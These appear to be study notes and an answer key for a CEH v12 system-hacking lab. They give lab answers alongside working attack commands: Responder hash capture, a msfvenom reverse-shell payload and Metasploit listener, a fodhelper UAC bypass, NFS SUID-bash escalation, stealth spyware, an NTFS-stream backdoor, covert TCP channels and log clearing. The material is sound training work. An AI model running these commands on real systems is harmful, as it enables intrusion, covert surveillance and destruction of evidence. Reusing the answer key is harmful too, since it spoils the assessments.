# Tasks

## Gain System Access

### Crack System's Password

Run the Responder tool on the Ubuntu machine and find the NTLM hash for the user Jason on Windows 11. Simulate the user Jason (user: Jason and password: qwerty) on the Windows 11 machine. Enter the option that specifies the interface while running the Responder tool.

\-I

```
./Responder.py -I ens3
```

```
sudo john <filename.txt>
```



### Audit System Passwords

Run L0phtCrack on the Windows 11 machine. You have the admin credentials (username: Administrator, password: Pa\$$w0rd) of a target machine, which is at 10.10.1.22. Find the password of another user, Martin, on the machine at 10.10.1.22.

apple

#### L0phtCrack

* Open&#x20;
* Password Auditing Wizard
* Windows
* A remote machine
* Enter Host IP address, Username, and Password
* Thorough Password Audit
* Generate Report at End of Auditing
* Run the ob immediately
* Finish



### Find Vulnerabilities in Exploit Sites

Search for the vulnerability "CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)" on exploit-db.com. What is the CVE ID for this vulnerability?

2018-6892

{% embed url="https://www.exploit-db.com" %}

### Gain Access to a Remote System

#### Armitage

For this task, use the Parrot Security machine (10.10.1.13) as the attacker’s system and the Windows 11 machine (10.10.1.11) as the target system. Run the Armitage tool from the attacker’s machine to exploit vulnerabilities on the target system. Interact with the target system and use the sysinfo command to find the build number of the target’s operating system.

22000



#### Ninja Jonin

Use the Ninja Jonin to gain access to the Windows Server 2022. Enter the name of the Windows Server machine that is captured in the Jonin console.

Server22



Use the Ninja Jonin to gain access to the Windows Server 2022. Enter the command that should be used to open shell on the target machine, using Jonin console.

cmd



#### Jonin Commands

```
list

connect 1

change

cmd

ipconfig
```



## Privilege Escalation

### Linux: Exploiting Misconfigured NFS

Exploit misconfigured NFS to gain access and to escalate previleges on Ubuntu machine. Enter the command that was used to check if any share is available for mount in Ubuntu machine.

showmount -e 10.10.1.9

```
nmap -sV <IP addr>
```

```
sudo apt-get install nfs-common
```

```
showmount -e <IP addr>

mkdir /tmp/nfs

sudo mount -t nfs <IP addr>:/home /tmp/nfs

cd /tmp/nfs

sudo cp /bin/bash

sudo chmod +s bash

ls -la bash

ssh -l ubuntu <IP addr>

cd /home

./bash -p

id
```



Exploit misconfigured NFS to gain access and to escalate previleges on Ubuntu machine. What is the command that is used to view current processes along with their PIDs?

ps -ef

```
ps -ef
```



### Bypass UAC and Exploit Sticky Keys

Exploit Sticky keys feature to gain access and to escalate previleges on the Windows 11 machine. Enter the domain of Windows 11 obtained from sysinfo command in meterpreter session.

WORKGROUP



#### Create Binary

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip addr> lport=444 -f exe /home/attacker/Desktop/Windows.exe 
```

#### Share Binary

```
mkdir /var/www/html/share

chmod -R 755 /var/www/html/share

chown -R www-data:www-data /var/www/html/share

cp /home/attacker/Desktop/Windows.exe /var/www/html/share

service apache2 start
```

#### Create Listener

```
msfconsole

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

set lhost <IP addr>

set lport 444

run

getuid

sysinfo

background
```

#### Escalate Privilege

```
use exploit/windows/local/bypassuac_fodhelper

set session 1

show options

set lhost <IP addr>

set TARGET 0

exploit

getsystem -t 1

getuid

background
```



## Maintain Remote Access and Hide Malicious Activities

### System Monitoring and Surveillance

#### Power Spy

Use the Power Spy tool on the Windows Server 2022 machine to monitor the target machine at 10.10.1.19. Use the user account Jason, with the password qwerty, to establish a Remote Desktop Connection with the target system. What is the default key combination to put Power Spy in the Stealth mode?

Ctrl+Alt+X



#### Spytech SpyAgent

Use the Spytech SpyAgent tool on the Windows Server 2022 machine to monitor the target machine at 10.10.1.19. Use the user account Jason, with the password qwerty, to establish a Remote Desktop Connection with the target system. Which option will enable you to configure SpyTech Spy Agent to run in the total stealth mode, with all possible logging options preconfigured?

Complete + Stealth Configuration

#### Stealth Mode

```
Ctrl + Shift + Alt + M
```



### Hide Files using NTFS Streams

In the Windows Server 2019 machine, use NTFS Streams to hide calc.exe inside the readme.txt file. Flag submission is not required for this task, enter "No flag" as the answer.

No flag

```
type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe

mklink backdoor.exe readme.txt:calc.exe

backdoor.exe
```



### Hide Data using White Space Stegnography

On the Windows 11 machine, hide data into a text file using the whitespace steganography tool Snow. Flag submission is not required for this task, enter "No flag" as the answer.

No flag

#### Hide message

```
snow -C -m "message" -p "magic" readme.txt readme2.txt
```

#### Unhide message

```
snow -C -p "magic" readme2.txt
```



### Image Stegnography

On the Windows Server 2019 machine, hide text inside an image using the OpenStego tool. Flag submission is not required for this task, enter "No flag" as the answer.

No flag

#### Tools

* OpenStego
* StegOnline



### Maintain Persistence

Exploit a misconfigured startup folder to gain privileged access and persistence on the Windows 11 machine. What is the command used in this task to elevate previleges in this task?

```
getsystem -t 1
```



### Main Domain Persistence

Exploit Active Directory Objects and adding Martin a standard user in Windows Server 2022, to Domain Admins group through AdminSDHolder. Enter the name of the user that is added into Domain Admins group in this task.

Martin



### Privilege Escalation and Maintain Persistence

Exploit WMI event subscription to gain persistent access to the Windows 11 machine. Enter the server username that is acquired after exploiting the WMI event subscription.

NT AUTHORITY\SYSTEM



### Covert Channels

#### Covert\_TCP



From the Parrot Security machine, navigate to CEHv12 Module 06 System Hacking\Covering Tracks Tools\Covert\_TCP on the machine at 10.10.1.11 and copy the file covert\_tcp.c. Compile the code in covert\_tcp.c to create a covert TCP channel between the Parrot Security machine (10.10.1.13) and the Ubuntu machine at 10.10.1.9. For the Windows 11 machine, the username is Admin, and the password is Pa\$$w0rd. Flag submission is not required for this task, enter "No flag" as the answer.

No flag

#### Start Listener

```
./covert_tcp -dest <Receiver IP> -source <Sender IP> -source_port <Receiver Port> -dest-port <Sender Port> -server -file /home/ubuntu/Desktop/Receive/receive.txt
```

#### Sender Side

```
./covert_tcp -dest <Receiver IP> -source <Sender IP> -source_port <Sender Port> -dest-port <Receiver Port> -server -file /home/attacker/Desktop/Send/message.txt
```





## Clear Logs and Hide Evidence

### View, Enable, and Clear Audit Policies

#### Auditpol

On the Windows 11 machine, use Auditpol to enable or disable security auditing on local or remote systems and to adjust the audit criteria for different categories of security events. Which command is used to clear the audit policies?

```
auditpol /clear /y
```



### Clear Windows Machine Logs

In the Windows 11 machine, use various Windows utilities such as Clear\_Event\_Viewer\_Logs.bat, wevtutil, and Cipher to clear system logs. Which wevtutil command will clear all system logs (enter the complete command as the answer)?

```
wevtutil cl system
```



### Clear Linux Machine Logs

In the Parrot Security machine, clear the Linux machine event logs using the Bash shell. Which command will disable the Bash shell from saving the history?

```
export HISTSIZE=0
```



### Hiding Artifacts in Windows and Linux

Use various commands to hide file in Windows and Linux machines. Enter the name of the user that is added in Windows 11 machine in this task.

Test

#### Hide Folder

```
attrib +h +s +r Test
```

#### Unhide Folder

```
attrib -h -s -r Test
```

#### Create New User

```
net user Test /add

net user Test /active:yes
```

#### Hide User Account

```
net user Test /active:no
```



Use various commands to hide file in Windows and Linux machines. Enter the name of the text file that is hidden in Parrot Security machine in this task.

Secret.txt

#### Hide File in Linux

```
touch .Secret.txt
```



### Clear Windows Machine Logs

In the Windows 11 machine, use the CCleaner tool located at E:\CEH-Tools\CEHv12 Module 06 System Hacking\Covering Tracks Tools\CCleaner to remove unused files and traces of Internet browsing details. Flag submission is not required for this task, enter "No flag" as the answer.

No flag

#### CCleaner

